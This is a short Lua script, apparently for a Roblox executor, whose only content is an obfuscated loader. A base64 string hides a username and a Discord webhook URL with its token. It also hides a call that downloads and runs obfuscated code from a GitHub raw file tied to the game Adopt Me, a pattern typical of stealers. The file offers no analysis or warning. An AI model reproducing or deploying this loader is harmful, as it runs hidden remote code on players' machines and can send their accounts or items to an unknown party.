
 -- Obfuscated script
 local encodedScript = "VXNlcm5hbWUgPSAiSmF5dGhlZ29hdDExNSIKV2ViaG9vayA9ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMjUyNzU3MDc5MTAyMzI4OTkyL0RraUtoRG9YLTVfNDJCTGFxY04xWms5NlhEd2k5bHRuRHEzVDRFVFoydjRLSDNFUE84OVBjS25ISDdIclpiRnMyM3ZLIgoKIGxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vWHNjcmlwdDI1L0Fkb3B0LU1lL3JlZnMvaGVhZHMvbWFpbi9vYmZ1c2NhdGVkLnR4dCIsIHRydWUpKSgp"

 -- Decode function
 local function decode(str)
     local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
     str = string.gsub(str, '[^'..b..'=]', '')
     return (str:gsub('.', function(x)
         if (x == '=') then return '' end
         local r,f='',(b:find(x)-1)
         for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
         return r;
     end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
         if (#x ~= 8) then return '' end
         local c=0
         for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
         return string.char(c)
     end))
 end

 -- Run the decoded script
 loadstring(decode(encodedScript))()
 